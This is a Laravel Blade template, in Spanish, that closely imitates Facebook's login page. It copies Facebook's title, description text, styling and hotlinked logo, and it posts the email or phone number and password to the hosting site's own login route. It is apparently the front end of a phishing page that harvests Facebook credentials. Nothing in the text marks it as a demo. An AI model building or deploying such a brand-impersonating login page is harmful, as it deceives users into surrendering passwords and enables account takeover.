<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="utf-8">
    <title>Facebook - Inicia sesión</title>
    <meta name="description" content="Inicia sesión en Facebook para empezar a compartir y conectarte con tus amigos, tus familiares y las personas que conoces.">

    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 50px;
            max-width: 980px;
            padding: 20px;
        }

        .info-box {
            width: 500px;
            padding-right: 30px;
        }

        .info-box img {
            width: 300px;
            margin-bottom: -10px;
            margin-left: -30px;
        }

        .info-box h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
        }

        .login-box {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            text-align: center;
            width: 396px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            margin-bottom: 12px;
            box-sizing: border-box;
        }

        button,
        a[role="button"] {
            width: 100%;
            padding: 12px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            box-sizing: border-box;
        }

        .login-button {
            background-color: #1877f2;
            color: #fff;
            margin-bottom: 16px;
        }

        .forgot-password {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 16px;
        }

        .create-account-button {
            background-color: #42b72a;
            color: #fff;
        }

        .page-link {
            font-size: 14px;
            margin-top: 28px;
        }

        .page-link a {
            color: #1c1e21;
            font-weight: bold;
            text-decoration: none;
        }
    </style>
</head>

<body>
    <div class="main-container">
        <div class="info-box">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
            <h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
        </div>
        <div>
            <div class="login-box">
                <form method="POST" action="{{ route('login.submit') }}">
                    @csrf

                    <div>
                        <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" value="{{ old('email') }}" required>
                        @error('email')
                        <p style="color: red; font-size: 13px; text-align: left; margin-top: 5px;">
                            {{ $message }}
                        </p>
                        @enderror
                    </div>

                    <div>
                        <input type="password" name="password" placeholder="Contraseña" required>
                    </div>

                    <button type="submit" class="login-button">Iniciar sesión</button>
                </form>
                <a class="forgot-password" href="#">¿Olvidaste tu contraseña?</a>
                <div class="divider"></div>
                <a role="button" class="create-account-button" href="/registro">Crear cuenta nueva</a>
            </div>
            <p class="page-link"><a href="#">Crea una página</a> para una celebridad, una marca o un negocio.</p>
        </div>
    </div>
</body>

</html>